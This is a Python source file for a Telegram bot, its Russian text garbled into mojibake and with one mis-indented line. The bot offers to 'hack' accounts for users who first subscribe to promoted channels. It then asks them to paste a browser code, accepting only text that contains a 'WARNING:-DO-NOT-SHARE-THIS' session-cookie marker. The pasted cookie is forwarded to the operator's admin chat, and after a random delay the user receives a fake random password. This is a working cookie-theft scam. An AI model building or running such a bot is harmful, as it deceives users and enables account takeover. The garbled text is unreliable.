import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import threading
import random
import string
import time

TOKEN = '–í–ê–®_–¢–û–ö–ï–ù'
bot = telebot.TeleBot(TOKEN)

CHANNELS = ['–ö–ê–ù–ê–õ_–î–õ–Ø_–ü–û–î–ü–ò–°–ö–ò', '2–ö–ê–ù–ê–õ']
PRIVATE_CHANNEL_ID = –ê–ô–î–ò_–ü–†–ò–í–ê–¢_–ö–ê–ù–ê–õ–ê_–î–õ–Ø_–°–ë–û–†–ê_–ó–ê–Ø–í–û–ö_–ù–ê_–í–°–¢–£–ü–õ–ï–ù–ò–ï

CONFIRMED_USERS = set()
awaiting_code = set()
user_last_code = {}

ADMIN_CHAT_ID = –ê–ô–î–ò_–ß–ê–¢–ê_–ö–£–î–ê_–ü–†–ò–°–´–õ–ê–¢–¨_–°–û–û–ë–©–ï–ù–ò–Ø

def load_confirmed_users():
    try:
        with open('confirmed_users.json', 'r') as file:
            return set(json.load(file))
    except FileNotFoundError:
        return set()

def save_confirmed_users():
    with open('confirmed_users.json', 'w') as file:
        json.dump(list(CONFIRMED_USERS), file)

CONFIRMED_USERS = load_confirmed_users()

def is_subscribed_or_requested(user_id):
    try:
        for channel in CHANNELS:
            member_status = bot.get_chat_member(channel, user_id).status
            if member_status not in ['member', 'creator', 'administrator']:
                return False
        private_status = bot.get_chat_member(PRIVATE_CHANNEL_ID, user_id).status
        if private_status in ['member', 'restricted', 'left']:
            return True
        return False
    except telebot.apihelper.ApiTelegramException as e:
        if "USER_NOT_PARTICIPANT" in str(e):
            return True
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–ø–∏—Å–∫–∏: {e}")
        return False

def send_random_code(user_id):
    delay = random.randint(60, 86400)
    time.sleep(delay)
    random_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    bot.send_message(user_id, f"–ü–∞—Ä–æ–ª—å: {random_code}")

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.chat.id
    if user_id in CONFIRMED_USERS:
        bot.send_message(user_id, "–í—ã —É–∂–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –ø–æ–¥–ø–∏—Å–∫—É‚úÖ.\n–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /hack.")
        return

    markup = InlineKeyboardMarkup()
    for channel in CHANNELS:
        markup.add(InlineKeyboardButton("üëâ –ö–∞–Ω–∞–ª", url=f"https://t.me/{channel[1:]}"))
    markup.add(InlineKeyboardButton("üëâ–ö–∞–Ω–∞–ª", url="https://t.me/+RIJvLBoxEddlYzBi"))
    markup.add(InlineKeyboardButton("–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å ‚úÖ", callback_data='confirm_entry'))

    bot.send_message(
        user_id,
        "–ß—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º:\n1Ô∏è‚É£ –ü–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã.\n2Ô∏è‚É£ –ù–∞–∂–º–∏—Ç–µ '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å ‚úÖ'.",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'confirm_entry')
def confirm_entry(call):
    user_id = call.message.chat.id
    if is_subscribed_or_requested(user_id):
        CONFIRMED_USERS.add(user_id)
        save_confirmed_users()
        bot.answer_callback_query(call.id, "–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ!")
        bot.send_message(user_id, "–í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –ø–æ–¥–ø–∏—Å–∫—É ‚úÖ.\n–¢–µ–ø–µ—Ä—å –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É /hack.")
    else:
        bot.answer_callback_query(call.id, "–í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã –∏–ª–∏ –≤–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.")
        bot.send_message(user_id, "–í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã –∏–ª–∏ –≤–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞‚ùå.")

@bot.message_handler(commands=['hack'])
def hack_message(message):
    user_id = message.chat.id
    if user_id not in CONFIRMED_USERS:
        markup = InlineKeyboardMarkup()
        for channel in CHANNELS:
            markup.add(InlineKeyboardButton("üëâ –ö–∞–Ω–∞–ª", url=f"https://t.me/{channel[1:]}"))
        markup.add(InlineKeyboardButton("üëâ–ö–∞–Ω–∞–ª", url="https://t.me/+RIJvLBoxEddlYzBi"))
        markup.add(InlineKeyboardButton("–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å ‚úÖ", callback_data='confirm_entry'))

        bot.send_message(
            user_id,
            "–ß—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º:\n1Ô∏è‚É£ –ü–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã.\n2Ô∏è‚É£ –ù–∞–∂–º–∏—Ç–µ '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å ‚úÖ'.",
            reply_markup=markup
        )
        return

bot.send_message(user_id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ —Å –±—Ä–∞—É–∑–µ—Ä–∞.\n–ï—Å–ª–∏ –≤–∞–º –Ω–µ–ø–æ–Ω—è—Ç–Ω–æ, –Ω–∞–∂–º–∏—Ç–µ /help.")
    awaiting_code.add(user_id)

@bot.message_handler(commands=['help'])
def help_message(message):
    user_id = message.chat.id
    bot.send_message(user_id, "–ü–æ—Å–º–æ—Ç—Ä–∏—Ç–µ –≤–∏–¥–µ–æ–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –ø–æ —Å—Å—ã–ª–∫–µ: (—Å—Å—ã–ª–∫–∞)")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.chat.id
    if user_id in awaiting_code:
        if message.text.startswith('/help'):
            help_message(message)
            return

        if '_|' in message.text or 'WARNING:-DO-NOT-SHARE-THIS' in message.text:
            last_4_chars = message.text[-4:]
            if user_id in user_last_code and user_last_code[user_id] == last_4_chars:
                bot.send_message(user_id, "–ö–æ–¥ —Å–±—Ä–æ—à–µ–Ω, –≤–∑–ª–æ–º –æ—Ç–º–µ–Ω–µ–Ω‚ùå.\n–ü–µ—Ä–µ–∑–∞–π–¥–∏—Ç–µ –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç –∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é /hack.")
                awaiting_code.remove(user_id)
            else:
                user_last_code[user_id] = last_4_chars
                bot.send_message(user_id, "–ö–æ–¥ –≤–≤–µ–¥–µ–Ω –≤–µ—Ä–Ω–æ, –Ω–µ –æ–±–Ω–æ–≤–ª—è–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –±—Ä–∞—É–∑–µ—Ä–∞ –∏ –æ–∂–∏–¥–∞–π—Ç–µ –ø–∞—Ä–æ–ª—å‚úÖ.\n–û–∂–∏–¥–∞–Ω–∏–µ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 1 –¥–Ω—è.")
                bot.send_message(ADMIN_CHAT_ID, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–¥:\n{message.text}")
                threading.Thread(target=send_random_code, args=(user_id,)).start()
        else:
            bot.send_message(user_id, "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥‚ùå.\n–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /hack –∑–∞–Ω–æ–≤–æ.")
    else:
        if message.text.startswith('/help'):
            help_message(message)
        else:
            bot.send_message(user_id, "–°–Ω–∞—á–∞–ª–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /hack.")

bot.polling(none_stop=True)
